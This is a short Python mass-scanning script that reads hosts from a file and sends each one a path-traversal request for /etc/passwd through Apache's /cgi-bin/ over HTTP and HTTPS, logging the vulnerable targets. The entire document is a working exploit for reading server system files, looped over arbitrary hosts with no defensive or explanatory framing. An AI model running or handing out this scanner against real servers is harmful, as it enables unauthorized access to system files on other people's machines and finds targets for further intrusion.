import requests

def apache(host):
    try:
        uri="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        url='http://'+host+uri
        r=requests.get(url)
        if(r.status_code==200):
            with open("./success.txt","a+") as f:
                f.write(url)
                print(url)
        else:
            print("[失败]"+host)
    except:
        pass
def apaches(host):
    try:
        uri="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        url='https://'+host+uri
        r=requests.get(url)
        if(r.status_code==200):
            with open("./success.txt","a+") as f:
                f.write(url)
                print(url)
    except:
        pass
if __name__ == "__main__":
    while True:
        try:
            with open("./host.txt","r") as f:
                for line in f.readlines():
                    host=line.strip("\n")
                    print(host)
                    apache(host)
                    apaches(host)
        except Exception as e:
            print(e)
            
